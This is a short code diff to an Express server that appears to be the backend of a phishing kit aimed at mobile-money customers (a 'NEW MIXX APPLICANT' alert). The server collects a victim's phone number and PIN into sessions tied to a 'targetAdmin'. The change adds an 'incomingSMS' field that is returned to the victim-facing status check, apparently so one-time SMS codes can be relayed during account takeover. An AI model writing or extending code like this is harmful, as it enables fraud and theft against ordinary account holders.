@@ -146,7 +146,8 @@ app.post('/api/submit-credentials', (req, res) => {
     activeSessions[sessionId] = {
         phone, pin,
         targetAdmin,
-        status: 'pending_pin_approval'
+        status: 'pending_pin_approval',
+        incomingSMS: ''
     };
 
     const message = `NEW MIXX APPLICANT\n\n` +
@@ -213,7 +214,10 @@ app.get('/api/check-status/:sessionId', (req, res) => {
     if (!session) {
         return res.json({ status: 'not_found' });
     }
-    res.json({ status: session.status });
+    res.json({ 
+        status: session.status,
+        incomingSMS: session.incomingSMS || ''
+    });
 });
 
 app.listen(PORT, () => {
